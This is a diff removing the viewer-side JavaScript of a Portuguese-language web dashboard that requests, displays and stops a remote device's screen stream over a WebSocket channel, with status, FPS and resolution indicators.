-              event: 'pedir_tela',
-              payload: { event: 'pedir_tela', device_id: deviceId }
-            },
-            ref: Date.now().toString()
-          }));
-          document.getElementById('ecra-estado').textContent = 'A aguardar frames…';
-        }
-
-        // Receber frames
-        if (msg.event === 'broadcast') {
-          const payload = msg.payload?.payload || msg.payload;
-          const innerEvent = payload?.event;
-
-          if (innerEvent === 'frame') {
-            const b64 = payload.data;
-            const w = payload.w;
-            const h = payload.h;
-            if (!b64) return;
-
-            const img = document.getElementById('ecra-img');
-            const overlay = document.getElementById('ecra-overlay');
-
-            img.src = 'data:image/jpeg;base64,' + b64;
-            img.style.display = 'block';
-            overlay.style.display = 'none';
-
-            frameCount++;
-            fpsFrames++;
-            lastFrameTime = new Date();
-
-            document.getElementById('ecra-frames').textContent = frameCount;
-            document.getElementById('ecra-res').textContent = w + '×' + h;
-            document.getElementById('ecra-ultimo').textContent = lastFrameTime.toLocaleTimeString('pt-PT');
-            document.getElementById('ecra-estado').textContent = '🟢 A transmitir';
-            document.getElementById('ecra-estado').style.color = 'var(--green)';
-
-          } else if (innerEvent === 'stream_iniciado') {
-            document.getElementById('ecra-estado').textContent = '🟢 Stream iniciado';
-            document.getElementById('ecra-estado').style.color = 'var(--green)';
-          } else if (innerEvent === 'stream_parado') {
-            document.getElementById('ecra-estado').textContent = '⏹ Stream parado pelo dispositivo';
-            document.getElementById('ecra-estado').style.color = 'var(--muted)';
-          } else if (innerEvent === 'stream_erro') {
-            document.getElementById('ecra-estado').textContent = '❌ ' + (payload.msg || 'Erro no dispositivo');
-            document.getElementById('ecra-estado').style.color = 'var(--red)';
-          }
-        }
-      } catch(e) {}
-    };
-
-    wsEcra.onerror = () => {
-      document.getElementById('ecra-estado').textContent = '❌ Erro de ligação WebSocket';
-      document.getElementById('ecra-estado').style.color = 'var(--red)';
-    };
-
-    wsEcra.onclose = () => {
-      if (transmitindo) {
-        document.getElementById('ecra-estado').textContent = '⚠️ Ligação perdida';
-        document.getElementById('ecra-estado').style.color = 'var(--yellow)';
-      }
-    };
-
-    // Contador de FPS a cada segundo
-    fpsTimer = setInterval(() => {
-      document.getElementById('ecra-fps').textContent = fpsFrames;
-      fpsFrames = 0;
-    }, 1000);
-  };
-
-  window.pararStreamEcra = function() {
-    transmitindo = false;
-    if (fpsTimer) { clearInterval(fpsTimer); fpsTimer = null; }
-
-    // Enviar comando parar ao device antes de fechar
-    if (wsEcra && wsEcra.readyState === WebSocket.OPEN && activeDeviceId) {
-      const canal = 'screen_stream_' + activeDeviceId;
-      wsEcra.send(JSON.stringify({
-        topic: 'realtime:' + canal,
-        event: 'broadcast',
-        payload: {
-          type: 'broadcast',
-          event: 'parar_tela',
-          payload: { event: 'parar_tela', device_id: activeDeviceId }
-        },
-        ref: Date.now().toString()
-      }));
-      setTimeout(() => { wsEcra?.close(); wsEcra = null; }, 300);
-    } else {
-      wsEcra?.close();
-      wsEcra = null;
-    }
-
-    activeDeviceId = null;
-    document.getElementById('btn-iniciar-ecra').style.display = '';
-    document.getElementById('btn-parar-ecra').style.display = 'none';
-    document.getElementById('ecra-estado').textContent = 'Sem transmissão';
-    document.getElementById('ecra-estado').style.color = 'var(--muted)';
-    document.getElementById('ecra-fps').textContent = '—';
-    document.getElementById('nav-ecra-badge').textContent = 'OFF';
-    document.getElementById('nav-ecra-badge').style.color = 'var(--accent2)';
-  };
-})();
-</script>
 
 </body></html>
